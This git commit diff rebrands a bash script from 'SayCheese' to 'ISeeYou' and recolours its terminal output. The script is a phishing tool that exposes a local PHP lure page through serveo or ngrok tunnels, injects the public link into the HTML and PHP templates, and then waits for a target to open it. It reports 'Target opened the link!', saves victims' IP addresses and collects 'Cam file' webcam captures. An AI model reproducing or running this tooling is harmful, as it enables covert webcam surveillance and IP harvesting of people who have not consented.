7b43265ee47af8e7d11ac2ef511efdeb0687ac80
./user <99002223+orion110@users.noreply.github.com>
2026-06-28 23:50:17 -0500

    Make all text bright yellow in ISeeYou.sh

--- ISeeYou.sh
+++ ISeeYou.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-# SayCheese v1.0
+# ISeeYou v1.0
 # coded by: github.com/thelinuxchoice/saycheese
 # If you use any part from this code, giving me the credits. Read the Lincense!
 
@@ -8,14 +8,15 @@ trap 'printf "\n";stop' 2
 banner() {
 
 
-printf "\e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
-printf "\e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
-printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
-printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
-printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
-printf "\e[1;92m              |___/ \e[0m                                 \n"
+  printf "\e[1;93m▄█    ▄▄▄▄▄   ▄███▄   ▄███▄ ▀▄    ▄ ████▄   ▄   \e[0m\n"
+  printf "\e[1;93m██   █     ▀▄ █▀   ▀  █▀   ▀  █  █  █   █    █  \e[0m\n"
+  printf "\e[1;93m██ ▄  ▀▀▀▀▄   ██▄▄    ██▄▄     ▀█   █   █ █   █ \e[0m\n"
+  printf "\e[1;93m▐█  ▀▄▄▄▄▀    █▄   ▄▀ █▄   ▄▀  █    ▀████ █   █ \e[0m\n"
+  printf "\e[1;93m ▐            ▀███▀   ▀███▀  ▄▀           █▄ ▄█ \e[0m\n"
+  printf "\e[1;93m                                           ▀▀▀  \e[0m\n"
 
-printf " \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
+
+printf " \e[1;93m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
 
 printf "\n"
 
@@ -46,7 +47,7 @@ dependencies() {
 
 
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
- 
+
 
 
 }
@@ -55,7 +56,7 @@ catch_ip() {
 
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m] IP:\e[0m\e[1;93m %s\e[0m\n" $ip
 
 cat ip.txt >> saved.ip.txt
 
@@ -65,12 +66,12 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m] Waiting targets,\e[0m\e[1;93m Press Ctrl + C to exit...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+printf "\n\e[1;93m[\e[0m+\e[1;93m] Target opened the link!\n"
 catch_ip
 rm -rf ip.txt
 
@@ -79,12 +80,12 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;93m[\e[0m+\e[1;93m] Cam file received!\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
 
-done 
+done
 
 }
 
@@ -93,7 +94,7 @@ server() {
 
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m] Starting Serveo...\e[0m\n"
 
 if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
@@ -109,12 +110,12 @@ $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:
 
 sleep 8
 fi
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m] Starting php server... (localhost:3333)\e[0m\n"
 fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
+printf '\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;93m %s\n' $send_link
 
 }
 
@@ -122,7 +123,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
+sed 's+forwarding_link+'$link'+g' ISeeYou.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
@@ -136,7 +137,7 @@ echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+printf "\e[1;93m[\e[0m+\e[1;93m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
@@ -147,12 +148,12 @@ unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
 else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;93m pkg install wget\e[0m\n"
 exit 1
 fi
 
 else
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
@@ -164,15 +165,15 @@ fi
 fi
 fi
 
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+printf "\e[1;93m[\e[0m+\e[1;93m] Starting php server...\n"
+php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+printf "\e[1;93m[\e[0m+\e[1;93m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;93m[\e[0m*\e[1;93m] Direct link:\e[0m\e[1;93m %s\e[0m\n" $link
 
 payload_ngrok
 checkfound
@@ -184,10 +185,10 @@ rm -rf sendlink
 fi
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;93m01\e[0m\e[1;93m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;93m02\e[0m\e[1;93m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
+read -p $'\n\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m] Choose a Port Forwarding option: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server -eq 1 ]]; then
 
@@ -210,7 +211,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' ISeeYou.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
@@ -219,14 +220,14 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="saycheese$RANDOM"
+default_subdomain="ISeeYou$RANDOM"
 
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+printf '\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m] Choose subdomain? (Default:\e[0m\e[1;93m [Y/n] \e[0m\e[1;93m): \e[0m'
 read choose_sub
 choose_sub="${choose_sub:-${default_choose_sub}}"
 if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
 subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
+printf '\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m] Subdomain: (Default:\e[0m\e[1;93m %s \e[0m\e[1;93m): \e[0m' $default_subdomain
 read subdomain
 subdomain="${subdomain:-${default_subdomain}}"
 fi
@@ -240,4 +241,3 @@ checkfound
 banner
 dependencies
 start1
-
